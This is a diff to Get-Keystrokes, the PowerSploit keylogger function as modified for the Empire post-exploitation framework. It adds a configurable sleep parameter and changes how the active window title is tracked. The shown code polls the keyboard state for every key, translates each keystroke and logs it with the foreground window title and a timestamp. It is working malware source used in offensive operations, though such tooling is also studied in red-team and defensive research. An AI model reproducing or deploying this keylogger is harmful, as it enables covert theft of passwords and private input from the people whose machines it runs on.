@@ -1,21 +1,27 @@
 function Get-Keystrokes {
 <#
 .SYNOPSIS
- 
+
     Logs keys pressed, time and the active window (when changed).
     Some modifications for Empire by @harmj0y.
-    
+
     PowerSploit Function: Get-Keystrokes
     Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
     Modifications: @harmj0y
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-    
+
 .LINK
     http://www.obscuresec.com/
     http://www.exploit-monday.com/
 #>
+    param
+    (
+        [Parameter(Mandatory = $False)]
+        [string]
+        $Sleep = 1
+    )
 
     [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
 
@@ -107,14 +113,14 @@ function Get-Keystrokes {
     $LastWindowTitle = ""
 
     while ($true) {
-        Start-Sleep -Milliseconds 40
+        Start-Sleep -Milliseconds $Sleep
         $gotit = ""
         $Outout = ""
-        
+
         for ($char = 1; $char -le 254; $char++) {
             $vkey = $char
             $gotit = $ImportDll::GetAsyncKeyState($vkey)
-            
+
             if ($gotit -eq -32767) {
 
                 #check for keys not mapped by virtual keyboard
@@ -155,19 +161,21 @@ function Get-Keystrokes {
                 if ([Console]::CapsLock) {$Outout += '[Caps Lock]'}
 
                 $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
-                
+
                 $kbstate = New-Object Byte[] 256
                 $checkkbstate = $ImportDll::GetKeyboardState($kbstate)
-                
+
                 $mychar = New-Object -TypeName "System.Text.StringBuilder";
                 $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
 
-                #get the title of the foreground window
-                $TopWindow = $ImportDll::GetForegroundWindow()
-                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
-                
                 if ($unicode_res -gt 0) {
-                    if ($WindowTitle -ne $LastWindowTitle){
+                    #get the title of the foreground window
+                    $TopWindow = $ImportDll::GetForegroundWindow()
+
+                    if ($TopWindow -ne $LastTopWindow){
+                        $LastTopWindow = $TopWindow
+                        $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
+
                         # if the window has changed
                         $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                         $Outout = "`n`n$WindowTitle - $TimeStamp`n"
